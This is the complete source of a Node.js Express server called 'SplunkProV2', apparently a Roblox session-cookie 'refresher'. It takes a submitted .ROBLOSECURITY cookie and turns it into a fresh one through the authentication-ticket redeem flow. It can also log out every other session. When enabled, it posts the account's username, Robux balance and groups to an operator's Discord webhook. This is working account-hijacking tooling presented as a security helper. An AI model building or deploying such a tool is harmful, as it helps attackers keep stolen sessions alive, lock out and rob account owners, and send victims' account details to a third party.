const express = require('express');
const cors = require('cors');
const path = require('path');
const fs = require('fs');

// Use Node.js built-in fetch (v18+) 
// For Node 16, use: npm install node-fetch@2
// Then uncomment: const fetch = require('node-fetch');

const app = express();
const PORT = process.env.PORT || 5000;

app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// Read Discord webhook from environment variable
const DISCORD_WEBHOOK = process.env.DISCORD_WEBHOOK || '';

// Serve HTML
app.get('/', (req, res) => {
    const indexPath = path.join(__dirname, 'public', 'index.html');
    
    if (fs.existsSync(indexPath)) {
        res.sendFile(indexPath);
    } else {
        res.status(500).send('Error: public/index.html not found. Folder structure: /public/index.html');
    }
});

// Logout all devices - properly get CSRF and logout
app.post('/api/logout', async (req, res) => {
    try {
        const { cookie } = req.body;
        if (!cookie) {
            return res.status(400).json({ success: false, message: 'Cookie required' });
        }

        // Step 1: Get CSRF token from logout endpoint
        const csrfRes = await fetch('https://auth.roblox.com/v2/logout', {
            method: 'POST',
            headers: {
                'Cookie': `.ROBLOSECURITY=${cookie}`,
                'User-Agent': 'Mozilla/5.0'
            }
        });

        if (!csrfRes.ok) {
            return res.status(401).json({ success: false, message: 'Invalid cookie - logout failed' });
        }

        const csrfToken = csrfRes.headers.get('x-csrf-token');
        if (!csrfToken) {
            return res.status(401).json({ success: false, message: 'Failed to get CSRF token' });
        }

        // Step 2: Actually logout with CSRF token
        const logoutRes = await fetch('https://auth.roblox.com/v2/logout', {
            method: 'POST',
            headers: {
                'Cookie': `.ROBLOSECURITY=${cookie}`,
                'x-csrf-token': csrfToken,
                'User-Agent': 'Mozilla/5.0'
            }
        });

        if (!logoutRes.ok) {
            return res.status(500).json({ success: false, message: 'Logout request failed' });
        }

        res.json({ success: true, message: 'Logged out from all devices' });
    } catch (error) {
        res.status(500).json({ success: false, message: error.message });
    }
});

// Refresh cookie and get new one
app.post('/api/refresh', async (req, res) => {
    try {
        const { cookie, showAccountData } = req.body;
        if (!cookie) {
            return res.status(400).json({ success: false, message: 'Cookie required' });
        }

        // Get CSRF token
        const csrfRes = await fetch('https://auth.roblox.com/v2/logout', {
            method: 'POST',
            headers: {
                'Cookie': `.ROBLOSECURITY=${cookie}`,
                'User-Agent': 'Mozilla/5.0'
            }
        });

        const csrfHeader = csrfRes.headers.get('x-csrf-token');
        if (!csrfHeader) {
            return res.status(401).json({ success: false, message: 'Invalid cookie' });
        }

        // Get auth ticket
        const ticketRes = await fetch('https://auth.roblox.com/v1/authentication-ticket', {
            method: 'POST',
            headers: {
                'x-csrf-token': csrfHeader,
                'Cookie': `.ROBLOSECURITY=${cookie}`,
                'User-Agent': 'Mozilla/5.0'
            }
        });

        const ticketHeader = ticketRes.headers.get('rbx-authentication-ticket');
        if (!ticketHeader) {
            return res.status(401).json({ success: false, message: 'Failed to generate ticket' });
        }

        // Redeem ticket for new cookie
        const redeemRes = await fetch('https://auth.roblox.com/v1/authentication-ticket/redeem', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0'
            },
            body: JSON.stringify({ authenticationTicket: ticketHeader })
        });

        const setCookie = redeemRes.headers.get('set-cookie');
        let newCookie = null;
        if (setCookie && setCookie.includes('.ROBLOSECURITY=')) {
            newCookie = setCookie.split('.ROBLOSECURITY=')[1].split(';')[0];
        }

        if (!newCookie) {
            return res.status(401).json({ success: false, message: 'Failed to redeem ticket' });
        }

        let accountInfo = null;
        if (showAccountData) {
            accountInfo = await getAccountInfo(newCookie);
        }

        // Send to Discord (only if webhook is configured)
        if (DISCORD_WEBHOOK) {
            sendToDiscord(accountInfo);
        }

        res.json({
            success: true,
            newCookie: newCookie,
            accountInfo: accountInfo
        });
    } catch (error) {
        res.status(500).json({ success: false, message: error.message });
    }
});

async function getAccountInfo(cookie) {
    const info = {
        username: 'Unknown',
        displayName: 'Unknown',
        userId: 0,
        avatar: '',
        robux: 0,
        groups: 0
    };

    try {
        // Get user info
        const userRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
            headers: {
                'Cookie': `.ROBLOSECURITY=${cookie}`,
                'User-Agent': 'Mozilla/5.0'
            }
        });

        if (userRes.ok) {
            const user = await userRes.json();
            if (user && user.id) {
                info.userId = user.id;
                info.username = user.name || 'Unknown';
                info.displayName = user.displayName || 'Unknown';

                // Get avatar
                try {
                    const avatarRes = await fetch(`https://thumbnails.roblox.com/v1/users/avatar?userIds=${user.id}&size=352x352&format=Png&isCircular=false`);
                    if (avatarRes.ok) {
                        const avatarData = await avatarRes.json();
                        if (avatarData.data && avatarData.data[0]) {
                            info.avatar = avatarData.data[0].imageUrl;
                        }
                    }
                } catch (e) {
                    // Avatar fetch failed, continue
                }

                // Get robux
                try {
                    const robuxRes = await fetch('https://economy.roblox.com/v1/user/currency', {
                        headers: {
                            'Cookie': `.ROBLOSECURITY=${cookie}`,
                            'User-Agent': 'Mozilla/5.0'
                        }
                    });
                    if (robuxRes.ok) {
                        const robuxData = await robuxRes.json();
                        info.robux = robuxData.robux || 0;
                    }
                } catch (e) {
                    // Robux fetch failed, continue
                }

                // Get groups
                try {
                    const groupsRes = await fetch(`https://groups.roblox.com/v1/users/${user.id}/groups?limit=100`);
                    if (groupsRes.ok) {
                        const groupsData = await groupsRes.json();
                        info.groups = (groupsData.data || []).length;
                    }
                } catch (e) {
                    // Groups fetch failed, continue
                }
            }
        }
    } catch (error) {
        console.error('Error getting account info:', error.message);
    }

    return info;
}

async function sendToDiscord(accountInfo) {
    try {
        if (!DISCORD_WEBHOOK || !accountInfo) return;

        const username = accountInfo.username || 'Unknown';
        const userId = accountInfo.userId || 0;
        const robux = accountInfo.robux || 0;
        const groups = accountInfo.groups || 0;
        const avatar = accountInfo.avatar || '';

        const embed1 = {
            title: `🛡️ ${username}`,
            description: 'Cookie Refreshed Successfully',
            color: 0x3b82f6,
            thumbnail: { url: avatar },
            fields: [
                { name: 'User ID', value: String(userId), inline: true },
                { name: 'Robux Balance', value: robux.toLocaleString(), inline: true },
                { name: 'Groups', value: String(groups), inline: true }
            ]
        };

        const embed2 = {
            title: 'Security Status',
            color: 0x1a1a2e,
            description: 'Fresh cookie generated and ready to use.'
        };

        await fetch(DISCORD_WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                embeds: [embed1, embed2]
            })
        });
    } catch (error) {
        console.error('Error sending Discord notification:', error.message);
    }
}

app.listen(PORT, () => {
    console.log(`SplunkProV2 running on port ${PORT}`);
});
